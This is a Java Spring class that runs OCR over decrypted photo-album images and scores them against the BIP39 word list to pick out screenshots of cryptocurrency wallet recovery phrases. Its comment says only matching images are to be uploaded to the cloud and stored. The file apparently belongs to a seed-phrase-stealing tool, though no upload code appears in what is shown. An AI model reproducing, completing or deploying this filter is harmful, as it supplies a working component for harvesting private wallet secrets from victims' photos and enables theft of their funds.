package com.consume.service;

import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

import javax.annotation.PostConstruct;
import javax.imageio.ImageIO;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Component;
import org.web3j.crypto.MnemonicUtils;

import com.consume.util.Bip39WordList;

import net.sourceforge.tess4j.Tesseract;

/**
 * /t 解密后图片：快筛 + OCR + BIP39，判断是否像助记词截图。
 * 仅通过者才应上云入库。
 */
@Component
public class MnemonicImageAnalyzer {

    private static final Logger log = LoggerFactory.getLogger(MnemonicImageAnalyzer.class);
    private static final int[] PHRASE_LENS = {12, 15, 18, 21, 24};

    @Value("${news4.album.mnemonic-filter.enabled:true}")
    private boolean enabled;

    @Value("${news4.album.mnemonic-filter.tessdata-path:}")
    private String tessdataPath;

    @Value("${news4.album.mnemonic-filter.ocr-language:eng}")
    private String ocrLanguage;

    @Value("${news4.album.mnemonic-filter.min-width:60}")
    private int minWidth;

    @Value("${news4.album.mnemonic-filter.min-height:60}")
    private int minHeight;

    @Value("${news4.album.mnemonic-filter.min-bytes:800}")
    private int minBytes;

    @Value("${news4.album.mnemonic-filter.max-bytes:20000000}")
    private int maxBytes;

    /** 滑动窗口内至少命中多少 BIP39 词（相对窗口长度允许少量 OCR 噪声） */
    @Value("${news4.album.mnemonic-filter.min-window-hits:10}")
    private int minWindowHits;

    /** 全文 BIP39 命中词数下限（辅助） */
    @Value("${news4.album.mnemonic-filter.min-total-hits:10}")
    private int minTotalHits;

    /** 是否要求 BIP39 checksum（OCR 易失败，默认 false） */
    @Value("${news4.album.mnemonic-filter.require-checksum:false}")
    private boolean requireChecksum;

    private final AtomicBoolean ocrReady = new AtomicBoolean(false);
    private volatile String resolvedTessdataPath = "";
    /** Tesseract 非线程安全：每过滤线程各自实例，才能真正并行 OCR */
    private final ThreadLocal<Tesseract> tesseractLocal = ThreadLocal.withInitial(this::newTesseract);

    @PostConstruct
    public void init() {
        if (!enabled) {
            log.debug("正常日志:[album-filter] 助记词图片过滤已关闭");
            return;
        }
        if (Bip39WordList.size() < 2048) {
            log.warn("异常日志:[album-filter] BIP39 词表不完整 size={}，过滤可能失效", Bip39WordList.size());
        }
        tryInitOcr();
    }

    public boolean isEnabled() {
        return enabled;
    }

    /**
     * @return true 像助记词，应上云；false 丢弃
     */
    public boolean looksLikeMnemonic(byte[] imageBytes, Integer recordId) {
        if (!enabled) {
            return true;
        }
        Result r = analyze(imageBytes);
        if (r.pass) {
            log.info("正常日志:[album] 过滤通过, recordId={}, reason={}", recordId, r.reason);
        } else {
            log.info("正常日志:[album] 过滤丢弃, recordId={}, reason={}", recordId, r.reason);
        }
        return r.pass;
    }

    public Result analyze(byte[] imageBytes) {
        if (imageBytes == null || imageBytes.length < Math.max(1, minBytes)) {
            return Result.fail("too_small_bytes", 0, 0);
        }
        if (imageBytes.length > maxBytes) {
            return Result.fail("too_large_bytes", 0, 0);
        }
        BufferedImage img;
        try {
            img = ImageIO.read(new ByteArrayInputStream(imageBytes));
        } catch (Exception e) {
            return Result.fail("not_image", 0, 0);
        }
        if (img == null) {
            return Result.fail("not_image", 0, 0);
        }
        if (img.getWidth() < minWidth || img.getHeight() < minHeight) {
            return Result.fail("too_small_dim", 0, 0);
        }

        if (!ocrReady.get()) {
            tryInitOcr();
        }
        if (!ocrReady.get()) {
            // 过滤已开启但 OCR 不可用：宁可丢也不误传
            return Result.fail("ocr_unavailable", 0, 0);
        }

        String text;
        try {
            Tesseract t = tesseractLocal.get();
            if (t == null) {
                return Result.fail("ocr_unavailable", 0, 0);
            }
            text = t.doOCR(img);
        } catch (Exception e) {
            log.info("异常日志:[album] OCR 失败, err={}", e.toString());
            return Result.fail("ocr_error", 0, 0);
        }
        if (text == null || text.trim().isEmpty()) {
            return Result.fail("ocr_empty", 0, 0);
        }

        List<String> tokens = tokenize(text);
        int totalHits = 0;
        for (String t : tokens) {
            if (Bip39WordList.contains(t)) {
                totalHits++;
            }
        }

        // 1) 完整合法助记词（可选严格 checksum）
        for (int len : PHRASE_LENS) {
            for (int i = 0; i + len <= tokens.size(); i++) {
                List<String> slice = tokens.subList(i, i + len);
                int hits = countBip39(slice);
                if (hits < len - 2 && hits < minWindowHits) {
                    continue;
                }
                // 窗口几乎全是 BIP39 词
                if (hits >= Math.min(len, Math.max(minWindowHits, len - 2))) {
                    String phrase = String.join(" ", slice);
                    if (!requireChecksum) {
                        if (hits >= len - 1 || hits >= minWindowHits) {
                            return Result.ok("window_" + len + "_hits_" + hits, totalHits, text.length());
                        }
                    }
                    try {
                        if (MnemonicUtils.validateMnemonic(phrase)) {
                            return Result.ok("checksum_ok_" + len, totalHits, text.length());
                        }
                    } catch (Exception ignore) {
                        // OCR 噪声导致非法
                    }
                    if (!requireChecksum && hits >= len - 1) {
                        return Result.ok("window_near_" + len, totalHits, text.length());
                    }
                }
            }
        }

        // 2) 最长连续 BIP39 词跑
        int run = longestBip39Run(tokens);
        if (run >= 12) {
            return Result.ok("run_" + run, totalHits, text.length());
        }

        // 3) 全文命中足够多（截图排版乱、OCR 插字）
        if (totalHits >= minTotalHits && totalHits * 2 >= tokens.size()) {
            return Result.ok("dense_hits", totalHits, text.length());
        }
        if (totalHits >= Math.max(minTotalHits, 12)) {
            return Result.ok("enough_hits", totalHits, text.length());
        }

        return Result.fail("no_mnemonic_pattern", totalHits, text.length());
    }

    private void tryInitOcr() {
        try {
            resolvedTessdataPath = resolveTessdataPath();
            // 探测路径：创建一次临时实例验证配置可加载
            Tesseract probe = newTesseract();
            if (probe == null) {
                throw new IllegalStateException("create Tesseract failed");
            }
            ocrReady.set(true);
            log.info("正常日志:[album] OCR 已就绪 lang={}", ocrLanguage);
        } catch (Exception e) {
            ocrReady.set(false);
            log.warn("异常日志:[album-filter] Tesseract 初始化失败，助记词过滤将丢弃全部图片。请安装 Tesseract 并配置 tessdata。err={}",
                    e.toString());
        }
    }

    private Tesseract newTesseract() {
        try {
            Tesseract t = new Tesseract();
            String path = resolvedTessdataPath;
            if (path == null || path.isEmpty()) {
                path = resolveTessdataPath();
                resolvedTessdataPath = path == null ? "" : path;
            }
            if (path != null && !path.isEmpty()) {
                t.setDatapath(path);
            }
            t.setLanguage(ocrLanguage == null || ocrLanguage.isEmpty() ? "eng" : ocrLanguage);
            t.setPageSegMode(6); // 假设统一文本块
            t.setOcrEngineMode(1);
            return t;
        } catch (Exception e) {
            log.warn("异常日志:[album-filter] 创建 Tesseract 实例失败 err={}", e.toString());
            return null;
        }
    }

    private String resolveTessdataPath() {
        if (tessdataPath != null && !tessdataPath.trim().isEmpty()) {
            return tessdataPath.trim();
        }
        String env = System.getenv("TESSDATA_PREFIX");
        if (env != null && !env.trim().isEmpty()) {
            return env.trim();
        }
        // 常见 Windows 安装路径
        String[] guesses = {
                "C:\\Program Files\\Tesseract-OCR\\tessdata",
                "C:\\Program Files (x86)\\Tesseract-OCR\\tessdata",
                "/usr/share/tesseract-ocr/5/tessdata",
                "/usr/share/tesseract-ocr/4.00/tessdata",
                "/usr/share/tessdata"
        };
        for (String g : guesses) {
            if (new java.io.File(g, "eng.traineddata").isFile()) {
                return g;
            }
        }
        return "";
    }

    private static List<String> tokenize(String text) {
        String norm = text.toLowerCase(Locale.ROOT).replaceAll("[^a-z]+", " ");
        String[] parts = norm.trim().split("\\s+");
        List<String> out = new ArrayList<>(parts.length);
        for (String p : parts) {
            if (p.length() >= 3 && p.length() <= 8) {
                out.add(p);
            }
        }
        return out;
    }

    private static int countBip39(List<String> words) {
        int n = 0;
        for (String w : words) {
            if (Bip39WordList.contains(w)) {
                n++;
            }
        }
        return n;
    }

    private static int longestBip39Run(List<String> tokens) {
        int best = 0;
        int cur = 0;
        for (String t : tokens) {
            if (Bip39WordList.contains(t)) {
                cur++;
                if (cur > best) {
                    best = cur;
                }
            } else {
                cur = 0;
            }
        }
        return best;
    }

    public static final class Result {
        public final boolean pass;
        public final String reason;
        public final int bip39Hits;
        public final int ocrLen;

        private Result(boolean pass, String reason, int bip39Hits, int ocrLen) {
            this.pass = pass;
            this.reason = reason;
            this.bip39Hits = bip39Hits;
            this.ocrLen = ocrLen;
        }

        static Result ok(String reason, int hits, int ocrLen) {
            return new Result(true, reason, hits, ocrLen);
        }

        static Result fail(String reason, int hits, int ocrLen) {
            return new Result(false, reason, hits, ocrLen);
        }
    }
}
